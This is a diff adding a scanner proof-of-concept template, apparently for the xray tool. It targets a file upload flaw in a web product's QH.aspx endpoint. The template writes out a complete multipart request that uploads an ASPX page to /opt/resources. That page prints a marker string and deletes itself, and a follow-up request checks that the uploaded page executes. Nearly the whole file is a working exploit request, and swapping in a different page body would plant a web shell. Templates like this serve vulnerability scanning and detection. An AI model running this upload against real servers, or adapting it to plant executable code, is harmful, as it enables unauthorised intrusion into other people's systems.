@@ -1,0 +1,45 @@
+name: poc-yaml-hefeng-QH_aspx-File-upload
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /QH.aspx
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhbcZX7o0Hw19h3kr
+      body: "\
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr\r\n\
+        Content-Disposition: form-data; name=\"fileToUpload\"; filename=\"test666.aspx\"\r\n\
+        Content-Type: application/octet-stream\r\n\
+        \r\n\
+        <%@Page Language=\"C#\"%><%Response.Write(\"pboyjnnrfipmplsukdeczudsefxmywe\");System.IO.File.Delete(Request.PhysicalPath);%>\r\n\
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr\r\n\
+        Content-Disposition: form-data; name=\"action\"\r\n\
+        \r\n\
+        upload\r\n\
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr\r\n\
+        Content-Disposition: form-data; name=\"responderId\"\r\n\
+        \r\n\
+        ResourceNewResponder\r\n\
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr\r\n\
+        Content-Disposition: form-data; name=\"remotePath\"\r\n\
+        \r\n\
+        /opt/resources\r\n\
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr--\r\n\
+        "
+    expression: response.status == 200 
+
+  r1:
+    request:
+      method: GET
+      path: /opt/resources/test666.aspx
+    expression: response.status == 200 && response.body.bcontains(b'pboyjnnrfipmplsukdeczudsefxmywe')
+
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/140111076
